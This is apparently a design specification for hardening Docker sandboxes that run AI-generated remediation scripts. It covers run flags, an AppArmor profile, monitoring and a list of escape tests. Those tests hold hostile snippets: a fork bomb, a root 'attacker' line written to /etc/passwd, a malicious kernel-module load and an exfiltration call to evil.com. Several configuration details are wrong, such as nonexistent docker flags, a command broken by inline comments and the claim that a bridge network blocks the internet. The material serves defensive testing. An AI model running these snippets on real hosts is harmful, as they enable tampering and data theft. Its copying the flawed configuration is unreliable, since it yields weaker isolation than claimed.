## Docker Sandbox Security Specification

Complete hardening details for Phase 4 implementation.

### Threat Model

**Attack Vectors Mitigated**:
1. Code injection (AI generates malicious Python)
2. Privilege escalation (exploit kernel bugs to reach host root)
3. Lateral movement (escape container, reach other services)
4. Resource exhaustion (memory/CPU DoS)
5. Data exfiltration (read unauthorized files)

**Isolation Layers**:

```
┌─────────────────────────────────────┐
│ Host OS (untrusted code outside)    │
├─────────────────────────────────────┤
│ Docker Daemon (API control plane)   │
├─────────────────────────────────────┤
│ Cgroups (resource limits)           │  ← CPU, Memory hard limits
│ AppArmor/SELinux (capability drop)  │  ← System call filtering
│ Namespace (process, network, fs)    │  ← Isolation from host
├─────────────────────────────────────┤
│ Container (remediation code runs)   │
│ • read_only_rootfs=true             │  ← FS immutability
│ • network_mode=bridge (isolated)    │  ← No outbound to internet
│ • timeout=30s enforced              │  ← Kill runaway processes
└─────────────────────────────────────┘
```

### Security Configuration

#### Docker Run Flags

```bash
docker run \
  # Filesystem isolation
  --read-only \
  --tmpfs /tmp:size=100m,noexec \
  --tmpfs /run:size=50m,noexec \
  \
  # Network isolation
  --network bridge \
  --dns 8.8.8.8 \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  \
  # Resource limits (cgroups)
  --memory 512m \
  --memswap 512m \
  --cpus 0.5 \
  --pids-limit 10 \
  \
  # Capability drops (prevent escape)
  --cap-drop SYS_ADMIN \
  --cap-drop SYS_PTRACE \
  --cap-drop NET_ADMIN \
  --cap-drop SYS_MODULE \
  --cap-drop DAC_OVERRIDE \
  \
  # Security options
  --security-opt no-new-privileges \
  --security-opt apparmor=docker-default \
  \
  # Timeout (30 seconds)
  --timeout 30 \
  \
  # User
  --user 1000:1000 \
  \
  # Entry point
  --entrypoint python \
  remediation_image:latest \
  /opt/app/remediation.py
```

#### AppArmor Profile (Example)

```
#include <tunables/global>

profile docker-remediation flags=(attach_disconnected, mediate_deleted) {
  # Allow basic system calls
  capability chown,
  capability dac_override,
  capability setgid,
  capability setuid,

  # Deny dangerous syscalls
  deny capability sys_admin,
  deny capability sys_ptrace,
  deny capability sys_module,

  # Filesystem
  / r,
  /proc r,
  /sys r,
  /tmp/** w,      # /tmp writable
  /run/** w,      # /run writable
  deny / w,       # Root read-only

  # Network
  network inet dgram,
  network unix,
  deny network inet raw,

  # Ptrace
  deny ptrace,
}
```

### Testing Escape Attempts

All of these MUST fail (be blocked):

#### Test 1: Privilege Escalation via SYS_ADMIN
```python
import os
os.system("sudo -l")  # Should fail: no SYS_ADMIN
```

#### Test 2: Kernel Module Loading
```python
os.system("insmod malicious.ko")  # Should fail: no SYS_MODULE
```

#### Test 3: Process Tracing
```python
os.system("strace ls")  # Should fail: no SYS_PTRACE
```

#### Test 4: Write to Filesystem Root
```python
with open("/etc/passwd", "w") as f:
    f.write("attacker:x:0:0:...")  # Should fail: read_only_rootfs
```

#### Test 5: Memory Exhaustion
```python
data = []
while True:
    data.append([0] * 1000000)  # Should be killed at 512MB
```

#### Test 6: CPU Exhaustion
```python
import os
for i in range(100):
    os.fork()  # Should be killed: pids-limit=10
```

#### Test 7: Network Escape (Outbound to Internet)
```python
import urllib.request
urllib.request.urlopen("http://evil.com/exfil")  # Should fail: network isolation
```

#### Test 8: Dirty COW Exploit
```python
# Attempt to exploit kernel vulnerability to write to /
# Should fail: read_only_rootfs + modern kernel patches
```

### Monitoring & Limits

#### Resource Monitoring

```python
# During execution, monitor:
container.stats():
  memory_usage: float  # Kill if > 512MB
  cpu_percent: float   # Throttle if > 50% (0.5 CPU cores)
  io_read_bytes: int
  io_write_bytes: int  # Alert if excessive
```

#### Timeout Enforcement

```python
# Docker daemon enforces timeout automatically via OOM killer
# But also implement app-level timeout:
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Remediation script exceeded 30 seconds")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(30)  # 30-second alarm

try:
    # Execute remediation
    exec(remediation_script)
except TimeoutError:
    # Log timeout, return failure
    return {"exit_code": 124, "error": "Timeout"}
finally:
    signal.alarm(0)  # Cancel alarm
```

### Audit Logging

All sandbox executions logged:

```json
{
  "timestamp": "2026-05-31T14:30:00Z",
  "request_id": "exec-12345",
  "container_id": "abc123def456",
  "script_hash": "sha256:...",
  "exit_code": 0,
  "memory_peak_mb": 245,
  "cpu_percent_max": 48.5,
  "execution_time_seconds": 12.4,
  "stdout_lines": 15,
  "stderr_lines": 0,
  "status": "SUCCESS",
  "security_policy": "docker-remediation",
  "violated_rules": []
}
```

### Base Image Hardening

```dockerfile
FROM python:3.10-slim

# Remove unnecessary packages
RUN apt-get remove -y sudo passwd shadow

# Disable unnecessary services
RUN systemctl disable bluetooth wifi

# Create writable temporary directory
RUN mkdir -p /tmp /run && chmod 1777 /tmp /run

# Add non-root user
RUN useradd -m -u 1000 -s /sbin/nologin remediator

# Remove shell
RUN rm /bin/bash /bin/sh

USER remediator

# Set working directory
WORKDIR /opt/app

# Fail on non-zero exit
ENTRYPOINT ["python", "-u"]
```

### Verification Checklist

Before deploying sandboxes to production:

- [ ] All escape tests fail (blocked as expected)
- [ ] Memory limit enforced (kill at 512MB)
- [ ] CPU limit enforced (throttle at 0.5 cores)
- [ ] Timeout enforced (kill at 30s)
- [ ] Network isolation verified (no outbound to internet)
- [ ] Read-only FS verified (cannot modify /etc, /sys, /proc)
- [ ] Audit logging working (all executions logged)
- [ ] Performance acceptable (<500ms container startup)
- [ ] Cleanup successful (containers destroyed after execution)
- [ ] Scalability tested (1000+ sandboxes/day)

### References

- **Docker Security**: https://docs.docker.com/engine/security/
- **CIS Benchmark**: https://www.cisecurity.org/benchmark/docker
- **AppArmor**: https://wiki.ubuntu.com/AppArmor
- **Linux Namespace**: https://man7.org/linux/man-pages/man7/namespaces.7.html
- **Cgroups**: https://www.kernel.org/doc/html/latest/admin-guide/cgroups-v2.html

---

**Last Updated**: May 31, 2026  
